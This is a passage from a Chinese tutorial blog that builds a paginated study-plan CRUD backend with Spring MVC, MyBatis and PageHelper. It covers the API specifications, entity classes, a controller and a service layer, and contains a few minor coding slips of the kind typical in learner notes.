class_">MapperScannerConfigurer</span>();</span><br><span class="line">        <span class="comment">// mapper接口和mapper.xml所在共同包</span></span><br><span class="line">        mapperScannerConfigurer.setBasePackage(<span class="string">&quot;com.fu.mapper&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> mapperScannerConfigurer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="容器初始化配置类"><a href="#容器初始化配置类" class="headerlink" title="容器初始化配置类"></a>容器初始化配置类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringIocInit</span> <span class="keyword">extends</span> <span class="title class_">AbstractAnnotationConfigDispatcherServletInitializer</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *  root ioc容器的配置类</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt;[] getRootConfigClasses() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;DataSourceConfig.class,ServiceJavaConfig.class,MapperJavaConfig.class&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * web IoC容器配置类指定</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt;[] getServletConfigClasses() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;WebMvcJavaConfig.class&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * DispatcherServlet拦截路径</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> String[] getServletMappings() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/&quot;</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<hr>
<h1 id="案例实践一：任务列表"><a href="#案例实践一：任务列表" class="headerlink" title="案例实践一：任务列表"></a>案例实践一：任务列表</h1><h2 id="接口分析"><a href="#接口分析" class="headerlink" title="接口分析"></a>接口分析</h2><p>需要实现四个基本功能，包括：学习计划分页查询、学习计划删除、学习计划保存、学习计划修改。</p>
<p>学习计划分页查询：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 需求说明：</span></span><br><span class="line">	查询全部数据页数据</span><br><span class="line"><span class="comment">// 请求uri：</span></span><br><span class="line">	schedule/<span class="punctuation">&#123;</span>pageSize<span class="punctuation">&#125;</span>/<span class="punctuation">&#123;</span>currentPage<span class="punctuation">&#125;</span></span><br><span class="line"><span class="comment">// 请求方式：</span></span><br><span class="line">	get</span><br><span class="line"><span class="comment">// 响应的json：</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">200</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;flag&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="comment">//本页数据</span></span><br><span class="line">    data<span class="punctuation">:</span></span><br><span class="line">    <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span>id<span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span>title<span class="punctuation">:</span>&#x27;学习java&#x27;<span class="punctuation">,</span>completed<span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span>id<span class="punctuation">:</span><span class="number">2</span><span class="punctuation">,</span>title<span class="punctuation">:</span>&#x27;学习html&#x27;<span class="punctuation">,</span>completed<span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span>id<span class="punctuation">:</span><span class="number">3</span><span class="punctuation">,</span>title<span class="punctuation">:</span>&#x27;学习css&#x27;<span class="punctuation">,</span>completed<span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span>id<span class="punctuation">:</span><span class="number">4</span><span class="punctuation">,</span>title<span class="punctuation">:</span>&#x27;学习js&#x27;<span class="punctuation">,</span>completed<span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span>id<span class="punctuation">:</span><span class="number">5</span><span class="punctuation">,</span>title<span class="punctuation">:</span>&#x27;学习vue&#x27;<span class="punctuation">,</span>completed<span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">//分页参数</span></span><br><span class="line">    pageSize<span class="punctuation">:</span><span class="number">5</span><span class="punctuation">,</span> <span class="comment">// 每页数据条数 页大小</span></span><br><span class="line">    total<span class="punctuation">:</span><span class="number">0</span> <span class="punctuation">,</span> <span class="comment">// 总记录数</span></span><br><span class="line">    currentPage<span class="punctuation">:</span><span class="number">1</span> <span class="comment">// 当前页码</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



<p>学习计划删除</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">需求说明</span><br><span class="line">	根据id删除日程</span><br><span class="line">请求uri</span><br><span class="line">	schedule/<span class="punctuation">&#123;</span>id<span class="punctuation">&#125;</span></span><br><span class="line">请求方式</span><br><span class="line">	delete</span><br><span class="line">响应的json</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">200</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;flag&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



<p>学习计划保存</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">需求说明</span><br><span class="line">	增加日程</span><br><span class="line">请求uri</span><br><span class="line">	schedule</span><br><span class="line">请求方式</span><br><span class="line">	post</span><br><span class="line">请求体中的JSON</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    title<span class="punctuation">:</span> &#x27;&#x27;<span class="punctuation">,</span></span><br><span class="line">    completed<span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line">响应的json</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">200</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;flag&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



<p>学习计划修改</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">需求说明</span><br><span class="line">	根据id修改数据</span><br><span class="line">请求uri</span><br><span class="line">	schedule</span><br><span class="line">请求方式</span><br><span class="line">	put</span><br><span class="line">请求体中的JSON</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    id<span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">    title<span class="punctuation">:</span> &#x27;&#x27;<span class="punctuation">,</span></span><br><span class="line">    completed<span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line">响应的json</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">200</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;flag&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="后端程序搭建"><a href="#后端程序搭建" class="headerlink" title="后端程序搭建"></a>后端程序搭建</h2><h3 id="实体类设计"><a href="#实体类设计" class="headerlink" title="实体类设计"></a>实体类设计</h3><p>首先需要一个描述学习任务的实体类，每一个学习计划应该有它的id、内容和是否完成标识。同时，根据上文功能介绍，保存和修改数据时的title和completed都不能为空，所以可以添加<code>@NotBlank</code>注解（参见SpringMVC-校验注解使用）。保存时没有id值，因此不能添加注解</p>
<p>设计如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Schedule</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="meta">@NotBlanK</span></span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line">    <span class="meta">@NotBlanK</span></span><br><span class="line">    <span class="keyword">private</span> Boolean completed;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>响应的JSON数据应包括响应码、操作是否成功、返回的数据三个部分，为了方便构建返回的JSON数据，设计一个实体类如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">R</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">code</span> <span class="operator">=</span> <span class="number">200</span>; <span class="comment">//200成功状态码</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>; <span class="comment">//返回状态</span></span><br><span class="line">    <span class="keyword">private</span> Object data; <span class="comment">//返回具体数据</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> R <span class="title function_">ok</span><span class="params">(Object data)</span> &#123;</span><br><span class="line">        <span class="type">R</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">R</span>();</span><br><span class="line">        r.data = data;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> R <span class="title function_">fail</span><span class="params">(Object data)</span> &#123;</span><br><span class="line">        <span class="type">R</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">R</span>();</span><br><span class="line">        r.code = <span class="number">500</span>; <span class="comment">//错误码</span></span><br><span class="line">        r.flag = <span class="literal">false</span>; <span class="comment">//错误状态</span></span><br><span class="line">        r.data = data;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCode</span><span class="params">(<span class="type">int</span> code)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.code = code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isFlag</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFlag</span><span class="params">(<span class="type">boolean</span> flag)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.flag = flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getData</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setData</span><span class="params">(Object data)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.data = data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>分页查询时需要 每页数据条数 总记录数 当前页码 等数据，同样设计一个实体类存储</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span>  <span class="comment">// 无参构造器</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span> <span class="comment">// 全参构造器</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PageBean</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> currentPage; <span class="comment">// 当前页码</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> pageSize; <span class="comment">// 每页显示的数据量</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> total; <span class="comment">// 总数据条数</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;T&gt; data; <span class="comment">// 当前页的数据集合</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="三层架构框架"><a href="#三层架构框架" class="headerlink" title="三层架构框架"></a>三层架构框架</h3><p>创建三层架构软件包：controller、service、mapper(repository)；在resources文件夹下建一个与mapper同级的mapper目录存放xml文件。</p>
<p><code>controller</code> 目录：处理HTTP请求并返回响应。</p>
<ul>
<li>接收客户端的请求（如通过REST API）。</li>
<li>调用相应的服务层方法来处理业务逻辑。</li>
<li>将处理结果转换为适当的格式（如JSON或XML）并返回给客户端。</li>
<li>处理异常和错误，并提供友好的错误消息。</li>
</ul>
<p><code>service</code> 目录：包含业务逻辑和处理规则。</p>
<ul>
<li>实现具体的业务逻辑。</li>
<li>调用数据访问层（如<code>mapper</code>或<code>repository</code>）进行数据操作。</li>
<li>对外提供清晰的接口，供控制器或其他服务调用。</li>
<li>可以包含事务管理、缓存等高级功能。</li>
</ul>
<p><code>mapper</code> 或 <code>repository</code> 目录：负责与数据库交互，执行CRUD操作。</p>
<ul>
<li>定义数据访问接口，通常使用MyBatis、JPA等ORM框架实现。</li>
<li>提供基本的增删改查（CRUD）操作。</li>
<li>可以包含复杂的查询逻辑，如联表查询、聚合函数等。</li>
<li>在MyBatis中，<code>mapper</code>通常是一个接口，Spring会自动实现它。</li>
</ul>
<h4 id="controller"><a href="#controller" class="headerlink" title="controller"></a>controller</h4><p>创建<code>ScheduleController</code>类，添加<code>@RestController</code>注解以支持返回JSON数据并标记一个类为Spring MVC控制器，处理HTTP请求并将结果返回给客户端。添加<code>@RequestMapping(&quot;schedule&quot;)</code>注解确定其处理的请求URL</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 相当于@ResponseBody + @Controller</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;schedule&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ScheduleController</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="service"><a href="#service" class="headerlink" title="service"></a>service</h4><p>通常要创建接口和实现类，创建一个<code>ScheduleService</code>接口，用于声明业务层处理方法；在子目录<code>Imp</code>下创建对应实现类<code>ScheduleServiceImp</code>，并添加<code>@service</code>注解标识和配置服务层组件，便于Spring自动管理和依赖注入。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public interface ScheduleService &#123;</span><br><span class="line">&#125;</span><br><span class="line">//  ./Imp/</span><br><span class="line">@Service</span><br><span class="line">public class ScheduleServiceImp implements ScheduleService &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="mapper"><a href="#mapper" class="headerlink" title="mapper"></a>mapper</h4><p>创建mapper接口<code>ScheduleMapper</code>，同时在resources同路径目录下创建接口同名的XML文件，指定namespace为接口，用于编写SQL.</p>
<h3 id="处理逻辑编写"><a href="#处理逻辑编写" class="headerlink" title="处理逻辑编写"></a>处理逻辑编写</h3><p>四个功能，增删改查，每层使用四个函数分别实现；controller、service、mapper</p>
<ul>
<li>**<code>controller</code>**：负责接收请求和返回响应，作为应用的入口点。</li>
<li>**<code>service</code>**：包含业务逻辑，处理具体的业务需求。</li>
<li>**<code>mapper</code>&#x2F;<code>repository</code>**：负责与数据库交互，执行数据的持久化操作。</li>
</ul>
<h4 id="controller-1"><a href="#controller-1" class="headerlink" title="controller"></a>controller</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ScheduleController 处理与日程相关的HTTP请求。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/api/schedules&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ScheduleController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 自动注入 ScheduleService 服务层对象。</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Autowired</span> 注解用于自动装配依赖对象，Spring会自动查找并注入匹配的bean。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> ScheduleService scheduleService;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据分页参数查询日程列表。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> pageSize 每页显示的记录数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> currentPage 当前页码</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> R 包含查询结果的通用响应对象</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@GetMapping</span> 注解用于映射HTTP GET请求到特定处理方法上。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@PathVariable</span> 注解用于从URL路径中提取变量值。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/&#123;pageSize&#125;/&#123;currentPage&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> R <span class="title function_">page</span><span class="params">(<span class="meta">@PathVariable</span> <span class="type">int</span> pageSize,</span></span><br><span class="line"><span class="params">                  <span class="meta">@PathVariable</span> <span class="type">int</span> currentPage)</span> &#123;</span><br><span class="line">        <span class="type">R</span> <span class="variable">r</span> <span class="operator">=</span> scheduleService.page(pageSize, currentPage);</span><br><span class="line">        <span class="comment">// 日志输出</span></span><br><span class="line">        log.info(<span class="string">&quot;查询数据为：&#123;&#125;&quot;</span>, r);</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据ID删除日程。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> id 要删除的日程ID</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> R 包含操作结果的通用响应对象</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@DeleteMapping</span> 注解用于映射HTTP DELETE请求到特定处理方法上。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@DeleteMapping(&quot;/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> R <span class="title function_">remove</span><span class="params">(<span class="meta">@PathVariable</span> <span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="type">R</span> <span class="variable">r</span> <span class="operator">=</span> scheduleService.remove(id);</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 保存新的日程。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> schedule 要保存的日程对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> result 绑定结果，用于验证输入参数的有效性</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> R 包含保存结果的通用响应对象</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@PostMapping</span> 注解用于映射HTTP POST请求到特定处理方法上。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Validated</span> 注解用于启用方法参数级别的校验。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@RequestBody</span> 注解用于将HTTP请求体中的JSON数据绑定到方法参数对象上。</span></span><br><span class="line"><span class="comment">     * BindingResult 参数用于捕获和处理验证错误。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@PostMapping</span></span><br><span class="line">    <span class="keyword">public</span> R <span class="title function_">save</span><span class="params">(<span class="meta">@Validated</span> <span class="meta">@RequestBody</span> Schedule schedule, BindingResult result)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (result.hasErrors()) &#123;</span><br><span class="line">            <span class="keyword">return</span> R.fail(<span class="string">&quot;参数为空,无法保存！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">R</span> <span class="variable">r</span> <span class="operator">=</span> scheduleService.save(schedule);</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 更新现有的日程。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> schedule 要更新的日程对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> result 绑定结果，用于验证输入参数的有效性</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> R 包含更新结果的通用响应对象</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@PostMapping</span> 注解用于映射HTTP POST请求到特定处理方法上。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Validated</span> 注解用于启用方法参数级别的校验。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@RequestBody</span> 注解用于将HTTP请求体中的JSON数据绑定到方法参数对象上。</span></span><br><span class="line"><span class="comment">     * BindingResult 参数用于捕获和处理验证错误。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@PostMapping</span></span><br><span class="line">    <span class="keyword">public</span> R <span class="title function_">update</span><span class="params">(<span class="meta">@Validated</span> <span class="meta">@RequestBody</span> Schedule schedule, BindingResult result)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (result.hasErrors()) &#123;</span><br><span class="line">            <span class="keyword">return</span> R.fail(<span class="string">&quot;参数为空,无法修改！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">R</span> <span class="variable">r</span> <span class="operator">=</span> scheduleService.update(schedule);</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="service-1"><a href="#service-1" class="headerlink" title="service"></a>service</h4><p>接口设计：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ScheduleService</span> &#123;</span><br><span class="line">    R <span class="title function_">page</span><span class="params">(<span class="type">int</span> pageSize, <span class="type">int</span> currentPage)</span>;</span><br><span class="line">    R <span class="title function_">remove</span><span class="params">(Integer id)</span>;</span><br><span class="line">    R <span class="title function_">save</span><span class="params">(Schedule schedule)</span>;</span><br><span class="line">    R <span class="title function_">update</span><span class="params">(Schedule schedule)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接口实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ScheduleServiceImp 实现了 ScheduleService 接口，提供了具体的业务逻辑实现。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ScheduleServiceImp</span> <span class="keyword">implements</span> <span class="title class_">ScheduleService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 自动注入 ScheduleMapper 数据访问层对象。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> ScheduleMapper scheduleMapper;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据分页参数查询日程列表。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> pageSize 每页显示的记录数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> currentPage 当前页码</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> R 包含查询结果的通用响应对象</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 此方法使用 PageHelper 插件进行分页查询，并将查询结果封装到 PageInfo 和 PageBean 对象中。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> R <span class="title function_">page</span><span class="params">(<span class="type">int</span> pageSize, <span class="type">int</span> currentPage)</span> &#123;</span><br><span class="line">        <span class="comment">// 分页查询 + 结果数据装配</span></span><br><span class="line">        <span class="comment">// sql limitx,y</span></span><br><span class="line">        PageHelper.startPage(currentPage, pageSize);</span><br><span class="line">        List&lt;Schedule&gt; schedules = scheduleMapper.queryList();</span><br><span class="line">        System.out.println(schedules.toString());</span><br><span class="line">        <span class="comment">// 分页数据装配</span></span><br><span class="line">        PageInfo&lt;Schedule&gt; info = <span class="keyword">new</span> <span class="title class_">PageInfo</span>&lt;&gt;(schedules);</span><br><span class="line">        <span class="comment">// 装配PageBean</span></span><br><span class="line">        PageBean&lt;Schedule&gt; bean = <span class="keyword">new</span> <span class="title class_">PageBean</span>&lt;&gt;(currentPage, pageSize, info.getTotal(), info.getList());</span><br><span class="line">        <span class="type">R</span> <span class="variable">ok</span> <span class="operator">=</span> R.ok(bean);</span><br><span class="line">        <span class="keyword">return</span> ok;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据ID删除日程。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> id 要删除的日程ID</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> R 包含操作结果的通用响应对象</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 此方法调用 ScheduleMapper 的 deleteById 方法来执行删除操作，并根据操作结果返回相应的响应对象。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> R <span class="title function_">remove</span><span class="params">(Integer id)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">row</span> <span class="operator">=</span> scheduleMapper.deleteById(id);</span><br><span class="line">        <span class="keyword">if</span> (row &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> R.ok(<span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> R.fail(<span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 保存新的日程。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> schedule 要保存的日程对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> R 包含保存结果的通用响应对象</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 此方法调用 ScheduleMapper 的 insert 方法来执行插入操作，并根据操作结果返回相应的响应对象。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> R <span class="title 